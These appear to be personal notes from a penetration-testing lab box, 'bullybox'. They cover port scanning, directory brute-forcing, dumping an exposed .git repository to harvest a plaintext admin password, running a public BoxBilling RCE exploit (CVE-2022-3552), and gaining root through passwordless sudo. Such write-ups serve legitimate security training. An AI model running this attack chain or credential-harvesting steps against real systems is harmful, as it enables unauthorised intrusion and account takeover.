### Enumeration
```
IP=192.168.218.27
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
- 80
	- Apache httpd 2.4.52 ((Ubuntu))
	- nc -nv $IP 80
		- http
### Foothold
- 80
	- Go to IP, redirects to http://bullybox.local/
		- Add to /etc/hosts
	- Default landing page
		- ![[Pasted image 20240719113000.png]]
	- Register
		- email does not exist
	- Versions
		- box billy
			- < 4.22.1.5 RCE authenticated
			- python3 CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p Playing-Unstylish7-Provided
				- adjusted IP and port  get RCE as yuki
		- BoxBilling 4.22.1.5
	- Directory Brute force
		- dirsearch -u http://$IP
			- /.git
				- 403 forbidden
				- hack tricks git
					- git dumper
						- git-dumper http://bullybox.local/.git ~/bullybox
						- cat * | grep password
							- bb-config.php
								- mysql - admin:`Playing-Unstylish7-Provided
						- bb-config.sample.php
							- http://www.yourdomain.com/index.php?_url=/bb-admin
							- Use email: admin@bullybox.local:Playing-Unstylish7-Provided
							- Allows us to login
			- /api/api
			- /api
			- /bb-admin
				- ![[Pasted image 20240719113956.png]]
			- /blog
			- /cart
			- /CHANGELOG.md
			- /login
			- /forum
			- /sitemap.xml
			- /robots.txt
				- ![[Pasted image 20240719114222.png]]
				- /bb-data
					- blank
					- dirsearch -u http://bullybox.local/bb-data
						- nothing
			- /README.md
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- yuki
	- id
		- uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
	- sudo -l
		- (ALL) NOPASSWD: ALL
		- sudo su
			- rooted
### Credentials
### Lessons Learned